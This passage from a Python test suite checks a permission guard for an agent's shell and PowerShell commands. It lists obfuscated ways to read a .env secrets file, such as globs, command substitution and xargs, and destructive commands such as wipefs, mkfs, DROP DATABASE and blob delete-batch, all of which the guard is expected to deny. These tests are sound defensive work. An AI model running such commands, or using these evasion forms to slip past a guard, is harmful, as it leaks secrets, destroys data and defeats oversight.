    assert decision(project, "Stop-Computer -WhatIf", tool="PowerShell") == "ask"
    assert decision(project, "Stop-Computer", tool="PowerShell") == "deny"


# --- findings of the third review

@pytest.mark.parametrize("command,tool", [
    ("cat $(ls .en?)", "Bash"), ("cat $(echo .en?)", "Bash"), ("ls .en? | xargs cat", "Bash"),
    ("find . -maxdepth 1 -name '.en?' | xargs cat", "Bash"), ("echo \"$(<.en?)\"", "Bash"), ("for f in .en?; do cat $f; done", "Bash"),
    ("test -f .en? && cat \"$_\"", "Bash"), ("file -f .en?", "Bash"), ("export F=.en?; cat $F", "Bash"),
    ("declare g=.en?; cat $g", "Bash"), ("local h=.en?; cat ${h}", "Bash"), ("grep KEY .en?", "Bash"),
    ("grep -e KEY .en?", "Bash"), ("grep -rn KEY src .en?", "Bash"), ("sed -n p .en?", "Bash"),
    ("Get-Item .en? | Get-Content", "PowerShell"), ("gci .en? | gc", "PowerShell"), ("gc (gi .en?)", "PowerShell"),
    ("$f = gi .en?; gc $f", "PowerShell"), ("Get-ChildItem .en? | Select-String .", "PowerShell"),
    ("if [ -f .en? ]; then cat .en?; fi", "Bash"), ("ls .en? | parallel cat", "Bash"), ("cat `ls .en?`", "Bash"),
    ("while read l; do echo $l; done < .en?", "Bash"), ("! cat .en?", "Bash"), ("time head -1 .en?", "Bash"),
    ("f=$(ls .en?); cat $f", "Bash"), ("dir .en? | gc", "PowerShell"), ("Resolve-Path .en? | Get-Content", "PowerShell"),
])
def test_a_name_passed_on_to_a_reading_command_is_denied(project, command, tool):
    assert decision(project, command, tool=tool) == "deny"


def _link_folder(link, target):
    """A symbolic link where allowed, else a Windows junction, which needs no privilege."""

    try:
        os.symlink(target, link, target_is_directory=True)
        return
    except (OSError, NotImplementedError):
        if os.name != "nt":
            pytest.skip("cannot create a directory link here")
    made = subprocess.run(["cmd", "/c", "mklink", "/J", str(link), str(target)], capture_output=True)
    if made.returncode != 0:
        pytest.skip("cannot create a junction here")


def test_the_project_is_recognised_under_another_spelling_of_its_path(project, tmp_path_factory):
    """The working folder may reach the project through a link; the check must not switch itself off."""


    from jangseung.evidence.shell_glob_targets import GlobBudget, project_roots

    alias = tmp_path_factory.mktemp("alias") / "link"
    _link_folder(alias, project)
    roots = project_roots(project, alias)
    budget = GlobBudget(roots)
    assert budget.allows(alias) and budget.allows(alias / "certs") and budget.allows(project / "certs")
    assert not budget.allows(alias.parent) and not budget.allows(project.parent)
    found = expand_glob_word(".en?", alias, windows_style=False, include_hidden=False, budget=budget)
    assert found == (".env",)
    nested = project_roots(project, alias / "certs")
    assert GlobBudget(nested).allows(alias / "src") and not GlobBudget(nested).allows(alias.parent)
    # A working folder that is not in the project adds nothing.
    assert project_roots(project, alias.parent) == project_roots(project, project)[:2]


def test_a_link_inside_the_project_is_not_followed(project, tmp_path_factory):

    from jangseung.evidence.shell_glob_targets import GlobBudget

    outside = tmp_path_factory.mktemp("outside")
    (outside / "id_rsa").write_text("dummy\n", encoding="utf-8")
    (outside / "deep").mkdir()
    _link_folder(project / "out", outside)
    budget = GlobBudget(project)
    assert budget.list_names(project / "out") == [] and budget.list_names(project / "out" / "deep") == []
    assert budget.directories == 64
    for word in ("out/i*", "**/i*", "o*/i*", "out/deep/*"):
        assert expand_glob_word(word, project, windows_style=False, include_hidden=False, budget=budget) == ()
    assert decision(project, "cat out/i*") in {"ask", "deny"}
    assert expand_glob_word(".en?", project, windows_style=False, include_hidden=False, budget=budget) == (".env",)


@pytest.mark.parametrize("command", [
    "mkfs.vfat -n BOOT /dev/sdb1", "mkfs.fat -F32 -n EFI /dev/sda1", "mkfs.xfs -n size=8192 /dev/sdb1",
    "wipefs -af /dev/sda", "wipefs -qa /dev/sda1",
    "psql --command='drop table users'", "mysql --execute='DROP DATABASE test'",
    "clickhouse-client --query='TRUNCATE TABLE t'", "psql -c '/* x */ drop table users'",
    "psql -c 'EXPLAIN ANALYZE DELETE FROM users'", "psql -c 'WITH d AS (SELECT 1) DELETE FROM users'",
    "pg_restore -cC -d postgres dump", "pg_restore -cd app dump", "az storage blob delete-batch -s c",
])
def test_destroy_forms_found_by_the_third_review_are_denied(project, command):
    assert decision(project, command) == "deny"


@pytest.mark.parametrize("command", [
    "az storage blob upload -f delete-users.sql -c c -n x", "parted /dev/sda unit s print free", "fdisk -V",
    "sgdisk -V", "kill -0 1", "kill -s 0 1", "mkfs.ext4 -n /dev/sda1", "pg_restore -Fc -d app dump",
    "psql -c \"comment on table t is 'do not truncate me'\"", "psql -c \"insert into log values ('drop table x')\"",
    "wipefs /dev/sda", "wipefs -n /dev/sda",
])
def test_show_only_forms_found_by_the_third_review_are_not_denied(project, command):
    assert decision(project, command) == "ask"
